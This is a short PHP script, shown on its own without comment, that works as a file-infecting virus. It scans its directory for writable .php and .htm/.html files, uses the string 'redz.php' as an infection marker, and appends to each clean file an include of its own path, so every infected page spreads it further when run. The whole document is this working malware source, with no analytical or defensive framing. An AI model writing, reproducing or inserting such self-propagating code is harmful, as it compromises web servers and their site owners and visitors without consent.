<?php

$handle=opendir('.');

while ($file = readdir($handle))

{ $inf_=true;
  $ext_=false;

 if ( ($ext_ = strstr ($file, '.php')) || ($ext_ = strstr ($file, '.htm')) || ($ext_ = strstr ($file, '.html')) )
 if ( is_file($file) && is_writeable($file) )
 {
   $host = fopen($file, "r");
   $contents = fread ($host, filesize ($file));
   $sig = strstr ($contents, 'redz.php');
   if(!$sig) $inf_=false;
 }
 if (($inf_==false))
  {
   $host = fopen($file, "a");
   fputs($host,"<?php ");
   fputs($host,"include(\"");
   fputs($host,__FILE__);
   fputs($host,"\"); ");
   fputs($host,"?>");
   fclose($host);
   return;
 }
}
closedir($handle);
?>
